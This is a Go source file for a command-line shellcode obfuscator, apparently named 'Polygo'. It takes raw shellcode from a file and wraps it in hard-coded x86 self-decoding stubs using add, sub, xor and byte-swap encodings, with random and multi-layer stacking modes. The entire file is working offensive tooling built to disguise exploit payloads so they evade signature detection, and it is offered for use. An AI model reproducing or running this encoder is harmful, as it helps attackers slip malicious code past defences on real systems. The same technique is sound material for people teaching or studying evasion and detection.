package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"time"
)

func add(shellcode []byte, randomByte int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x6c\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] += byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func sub(shellcode []byte, randomByte int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x44\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] -= byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func xor(shellcode []byte, randomByte int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x74\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] ^= byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func swap(shellcode []byte) []byte {
	decoder := []byte("\xeb\x20\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x00\x8a\x44\x0e\xff\x8a\x5c\x0e\xfe\x88\x5c\x0e\xff\x88\x44\x0e\xfe\x80\xe9\x02\x75\xeb\xeb\x05\xe8\xdb\xff\xff\xff")

	shellcodeLen := len(shellcode)
	if shellcodeLen%2 != 0 {
		shellcode = append(shellcode, 0x90)
		shellcodeLen += 1
	}
	decoder[10] = byte(shellcodeLen)
	for i := 0; i < shellcodeLen; i += 2 {
		shellcode[i], shellcode[i+1] = shellcode[i+1], shellcode[i]
	}
	return append(decoder, shellcode...)
}

func printShellcode(shellcode []byte) {
	fmt.Println("\nShellcode len:", len(shellcode))
	fmt.Println("Shellcode:")
	for i := range shellcode {
		fmt.Printf("\\x%02x", shellcode[i])
	}
	fmt.Println()
}

func random(shellcode []byte) []byte {
	randomByte := rand.Intn(255) + 1
	method := rand.Intn(4)
	if method == 0 {
		fmt.Printf("[+] Add method (0x%x)\n", randomByte)
		return add(shellcode, randomByte)
	} else if method == 1 {
		fmt.Printf("[-] Sub method (0x%x)\n", randomByte)
		return sub(shellcode, randomByte)
	} else if method == 2 {
		fmt.Printf("[^] Xor method (0x%x)\n", randomByte)
		return xor(shellcode, randomByte)
	} else if method == 3 {
		fmt.Printf("[~] Swap method\n")
		return swap(shellcode)
	}
	return shellcode
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func crazy(shellcode []byte) []byte {
	order := rand.Perm(4)
	for i := range order {
		randomByte := rand.Intn(255) + 1
		if i == 0 {
			shellcode = add(shellcode, randomByte)
			fmt.Printf("[+] Add method (0x%x)\n", randomByte)
		}
		if i == 1 {
			shellcode = sub(shellcode, randomByte)
			fmt.Printf("[-] Sub method (0x%x)\n", randomByte)
		}
		if i == 2 {
			shellcode = xor(shellcode, randomByte)
			fmt.Printf("[^] Xor method (0x%x)\n", randomByte)
		}
		if i == 3 {
			shellcode = swap(shellcode)
			fmt.Printf("[~] Swap method\n")
		}
	}

	return shellcode
}

func brainless(shellcode []byte, rounds uint) []byte {
	for i := 0; i < int(rounds); i++ {
		shellcode = random(shellcode)
	}
	return shellcode
}

func banner() {
	fmt.Print(`

		██████╗  ██████╗ ██╗  ██╗   ██╗ ██████╗  ██████╗ 
		██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔════╝ ██╔═══██╗
		██████╔╝██║   ██║██║   ╚████╔╝ ██║  ███╗██║   ██║
		██╔═══╝ ██║   ██║██║    ╚██╔╝  ██║   ██║██║   ██║
		██║     ╚██████╔╝███████╗██║   ╚██████╔╝╚██████╔╝
		╚═╝      ╚═════╝ ╚══════╝╚═╝    ╚═════╝  ╚═════╝ 
                 
		
			  made with ♥ by leco & atsika

`)

}

func main() {

	banner()

	rand.Seed(time.Now().UnixNano())
	randomByte := rand.Intn(255) + 1

	argBrainless := flag.Uint("brainless", 0, "Specify the number of recursive encapsulated obfuscation methods")
	argCrazy := flag.Bool("crazy", false, "Recursively obfuscate the shellcode with all methods")
	argFile := flag.String("f", "", "File containing raw shellcode")
	argXor := flag.Bool("xor", false, "Use xor ofuscation")
	argAdd := flag.Bool("add", false, "Use add ofuscation")
	argSub := flag.Bool("sub", false, "Use sub ofuscation")
	argSwap := flag.Bool("swap", false, "Use swap ofuscation")
	argRandom := flag.Bool("random", false, "Use random ofuscation")

	flag.Parse()

	if *argFile == "" {
		fmt.Println("Missing -f argument. Try", os.Args[0], "-h.")
		os.Exit(1)
	}

	shellcode, err := ioutil.ReadFile(*argFile)
	check(err)

	if *argAdd {
		shellcode = add(shellcode, randomByte)
	} else if *argSub {
		shellcode = sub(shellcode, randomByte)
	} else if *argXor {
		shellcode = xor(shellcode, randomByte)
	} else if *argSwap {
		shellcode = swap(shellcode)
	} else if *argRandom {
		shellcode = random(shellcode)
	} else if *argCrazy {
		shellcode = crazy(shellcode)
	} else if *argBrainless != 0 {
		shellcode = brainless(shellcode, *argBrainless)
	} else {
		fmt.Println("Missing arguments. Specify an obfuscation method. Try", os.Args[0], "-h.")
		os.Exit(1)
	}

	printShellcode(shellcode)
}
